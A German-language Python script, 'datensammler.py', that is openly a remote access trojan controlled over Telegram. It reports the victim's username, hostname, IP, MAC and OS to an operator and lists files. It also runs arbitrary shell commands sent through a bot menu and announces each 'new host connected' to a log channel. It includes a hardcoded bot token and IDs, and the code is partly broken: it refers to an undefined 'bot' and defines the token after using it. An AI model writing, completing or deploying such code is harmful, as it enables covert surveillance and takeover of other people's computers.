#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
datensammler.py - VEREINFACHTE VERSION
Nur ein Telegram Bot Token - Keine zusätzlichen Bots
"""

import os
import sys
import json
import socket
import platform
import subprocess
import threading
import time
from datetime import datetime
import telebot
from telebot import types
import requests
import uuid
import psutil
import getpass
from config import telebot

# ==================== KONFIGURATION ====================
# ==================== BOT INITIALISIERUNG ====================
telebot = telebot.TeleBot(BOT_TOKEN)

# EINZIGER BOT TOKEN - HIER EINTRAGEN!
BOT_TOKEN = "8746163440:AAFbrUUlkEal0eidxekyBH1yrDREow4JtEo"

# DEINE TELEGRAM ID - HIER EINTRAGEN!
MASTER_ID = "6976176725"

# OPTIONAL: CHANNEL FÜR LOGS - HIER EINTRAGEN!
CHANNEL_ID = "-1003734383961"  # Kann leer bleiben: ""

# ==================== HELPER FUNCTIONS ====================
def get_system_info():
    """Holt Systeminformationen"""
    try:
        info = {
            "System": platform.system(),
            "Node": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "Username": getpass.getuser(),
            "Hostname": socket.gethostname(),
            "IP": get_ip_address(),
            "MAC": get_mac_address(),
            "RAM": f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
            "CPU Cores": psutil.cpu_count(),
            "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        }
        return json.dumps(info, indent=2)
    except Exception as e:
        return f"Fehler beim Sammeln: {str(e)}"

def get_ip_address():
    """Holt öffentliche IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "Unbekannt"

def get_mac_address():
    """Holt MAC-Adresse"""
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0,8*6,8)][::-1])
        return mac
    except:
        return "Unbekannt"

def list_files(path="."):
    """Listet Dateien im Verzeichnis"""
    try:
        files = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isfile(item_path):
                size = os.path.getsize(item_path)
                files.append(f"{item} ({size} bytes)")
        return "\n".join(files[:50])  # Nur erste 50 Dateien
    except Exception as e:
        return f"Fehler: {str(e)}"

def execute_command(cmd):
    """Führt Shell-Befehl aus"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        if len(output) > 4000:
            output = output[:4000] + "\n...gekürzt"
            return output

    except Exception as e:
        return f"Fehler: {str(e)}"

# ==================== TELEGRAM COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Start Command"""
    if str(message.chat.id) != MASTER_ID:
        bot.reply_to(message, "⛔ Unauthorisiert!")
        return
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('📊 System Info')
    btn2 = types.KeyboardButton('📁 Dateien Liste')
    btn3 = types.KeyboardButton('🖥️ Command ausführen')
    btn4 = types.KeyboardButton('📸 Screenshot')
    btn5 = types.KeyboardButton('🎥 Webcam')
    btn6 = types.KeyboardButton('🔒 Lock Device')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(message.chat.id, 
                    "😈 **DATENSAMMLER AKTIV** 😈\n"
                    "Wähle eine Option:", 
                    parse_mode='Markdown',
                    reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handles all text messages"""
    if str(message.chat.id) != MASTER_ID:
        return
    
    text = message.text
    
    if text == '📊 System Info':
        info = get_system_info()
        bot.send_message(message.chat.id, f"```\n{info}\n```", parse_mode='Markdown')
    
    elif text == '📁 Dateien Liste':
        files = list_files()
        bot.send_message(message.chat.id, f"📁 **Dateien im aktuellen Verzeichnis:**\n```\n{files}\n```", 
                        parse_mode='Markdown')
    
    elif text == '🖥️ Command ausführen':
        msg = bot.send_message(message.chat.id, "Gib den Befehl ein:")
        bot.register_next_step_handler(msg, process_command)
    
    elif text == '📸 Screenshot':
        bot.send_message(message.chat.id, "⚠️ Screenshot-Funktion muss implementiert werden")
    
    elif text == '🎥 Webcam':
        bot.send_message(message.chat.id, "⚠️ Webcam-Funktion muss implementiert werden")
    
    elif text == '🔒 Lock Device':
        confirm_msg = bot.send_message(message.chat.id, 
                                      "⚠️ **WARNUNG: Gerät wird gesperrt!**\n"
                                      "Bestätige mit 'JA'", 
                                      parse_mode='Markdown')
        bot.register_next_step_handler(confirm_msg, confirm_lock)

def process_command(message):
    """Processes shell commands"""
    cmd = message.text
    if cmd.lower() == 'exit':
        bot.send_message(message.chat.id, "❌ Befehl abgebrochen")
        return
    
    bot.send_message(message.chat.id, f"⚡ Ausführe: `{cmd}`", parse_mode='Markdown')
    
    # In Thread ausführen um Timeout zu vermeiden
    def run_cmd():
        try:
            output = execute_command(cmd)
            # Aufteilen falls zu lang
            if len(output) > 4000:
                for i in range(0, len(output), 4000):
                    bot.send_message(message.chat.id, f"```\n{output[i:i+4000]}\n```", 
                                   parse_mode='Markdown')
            else:
                bot.send_message(message.chat.id, f"```\n{output}\n```", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Fehler: {str(e)}")
    
    thread = threading.Thread(target=run_cmd)
    thread.start()

def confirm_lock(message):
    """Confirms device lock"""
    if message.text.upper() == 'JA':
        bot.send_message(message.chat.id, "🔒 Sperre Gerät...")
        # Lock-Funktion hier implementieren
        # z.B.: subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
    else:
        bot.send_message(message.chat.id, "❌ Abgebrochen")

# ==================== LOGGING TO CHANNEL ====================
def log_to_channel(text):
    """Sendet Logs an Channel"""
    if CHANNEL_ID:
        try:
            bot.send_message(CHANNEL_ID, text)
        except:
            pass

# ==================== MAIN LOOP ====================
def main():
    """Hauptfunktion"""
    print("😈 Datensammler gestartet...")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Master ID: {MASTER_ID}")
    
    # Startnachricht an Master
    try:
        bot.send_message(MASTER_ID, "✅ **Datensammler aktiv!**\n"
                          f"System: {platform.system()} {platform.release()}\n"
                          f"User: {getpass.getuser()}\n"
                          f"IP: {get_ip_address()}", parse_mode='Markdown')
    except:
        print("⚠️ Konnte Startnachricht nicht senden")
    
    # Log an Channel
    log_to_channel(f"🚀 Neuer Host verbunden: {getpass.getuser()}@{socket.gethostname()}")
    
    # Bot starten
    try:
        bot.polling(none_stop=True, interval=1, timeout=30)
    except Exception as e:
        print(f"❌ Bot Fehler: {e}")
        time.sleep(5)
        main()  # Restart

if __name__ == "__main__":
    # Prüfe Token
    if BOT_TOKEN == "DEIN_TELEGRAM_BOT_TOKEN_HIER":
        print("❌ FEHLER: Bot Token nicht gesetzt!")
        print("1. Gehe zu @BotFather auf Telegram")
        print("2. Erstelle neuen Bot mit /newbot")
        print("3. Token kopieren und in BOT_TOKEN eintragen")
        sys.exit(1)
    
    if MASTER_ID == "DEINE_TELEGRAM_ID_HIER":
        print("❌ FEHLER: Master ID nicht gesetzt!")
        print("1. Gehe zu @userinfobot auf Telegram")
        print("2. Deine ID kopieren und in MASTER_ID eintragen")
        sys.exit(1)
    
    main()
